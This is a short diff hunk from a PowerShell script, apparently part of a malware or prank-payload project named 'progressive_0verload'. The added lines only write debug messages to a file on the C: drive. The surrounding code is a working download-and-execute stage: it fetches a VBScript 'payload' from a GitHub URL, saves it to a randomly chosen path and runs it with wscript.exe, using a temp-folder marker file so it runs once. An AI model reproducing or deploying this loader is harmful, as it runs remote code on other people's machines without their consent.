@@ -31,12 +31,15 @@ if([string]::IsNullOrEmpty($basePath) -or
     [string]::IsNullOrEmpty($childServicePropertyName)){
     $mutex.WaitOne()
     try {
+        echo "Something is null" >> "C:\nulled.txt"
         if(-not(Test-Path -Path "$env:temp\598600304.txt" -PathType Leaf)){
+            echo "no file in temp dir" >> "C:\nulled.txt"
             $pa = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
             $pa = "$pa\async_fun.vbs"
             iwr -uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/warning.vbs" -OutFile "$pa"
             wscript.exe $pa
             New-Item -Path "$env:temp\598600304.txt" -ItemType File -Force
+            echo "Something is null2" >> "C:\nulled.txt"
         }
     }
     finally {
